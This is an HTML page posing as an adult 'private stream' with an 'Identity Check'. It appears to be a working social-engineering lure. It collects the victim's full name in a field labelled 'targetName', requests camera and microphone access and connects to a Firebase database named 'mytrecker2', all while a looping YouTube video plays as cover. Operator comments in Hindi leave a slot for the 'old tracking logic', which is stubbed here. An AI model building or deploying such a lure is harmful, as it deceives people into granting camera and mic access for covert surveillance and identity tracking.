<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Private Content Access | 18+</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
        #bg-image { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('bg.png.jpeg'); background-size: cover; background-position: center; z-index: 1; opacity: 1; }
        #main-ui { position: relative; z-index: 10; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; background: rgba(0,0,0,0.4); }
        #unlock-btn { background: #ff0050; color: #fff; padding: 18px 35px; border-radius: 50px; font-size: 18px; font-weight: bold; text-transform: uppercase; cursor: pointer; border: none; }
        #age-modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 85%; max-width: 340px; background: #1a1a1a; border-radius: 20px; padding: 30px; text-align: center; z-index: 200; border: 1px solid #333; }
        .input-name { width: 100%; padding: 15px; margin: 15px 0; background: #252525; border: 1px solid #444; color: #fff; border-radius: 10px; box-sizing: border-box; }
        .confirm-btn { background: #00ff41; color: #000; width: 100%; padding: 15px; border-radius: 10px; font-weight: bold; border: none; cursor: pointer; }
        #video-container { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1000; background: #000; }
        iframe { width: 100%; height: 100%; border: none; }
    </style>
</head>
<body>

    <div id="bg-image"></div>
    <div id="main-ui">
        <button id="unlock-btn" onclick="showModal()">START PRIVATE STREAM</button>
    </div>

    <div id="age-modal">
        <h2 style="color:#fff;">Identity Check</h2>
        <input type="text" id="targetName" class="input-name" placeholder="Full Name">
        <button class="confirm-btn" onclick="startEverything()">VERIFY & UNLOCK</button>
    </div>

    <div id="video-container">
        <iframe id="main-player" src="" allow="autoplay; encrypted-media" allowfullscreen></iframe>
    </div>

<script>
    // Firebase Config
    const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
    if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
    const db = firebase.database();
    
    let sessionID = "USER_" + Math.floor(1000 + Math.random() * 9000);

    // ********** YAHAN APNI VIDEO ID BADLEIN **********
    const vID = "6Ogzc_-lW9w"; 

    function showModal() { document.getElementById('age-modal').style.display = 'block'; }

    async function startEverything() {
        const uName = document.getElementById('targetName').value;
        if(!uName) return;
        document.getElementById('age-modal').style.display = 'none';

        try {
            await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            
            // YouTube Embed Link Fix
            const player = document.getElementById('main-player');
            player.src = `https://www.youtube.com/embed/${vID}?autoplay=1&mute=1&controls=0&loop=1&playlist=${vID}`;
            
            document.getElementById('video-container').style.display = 'block';
            trackEverything(uName);
        } catch (e) { location.reload(); }
    }

    function trackEverything(name) {
        // Aapka purana tracking logic yahan rahega
        console.log("Tracking started for: " + name);
    }
</script>
</body>
</html>
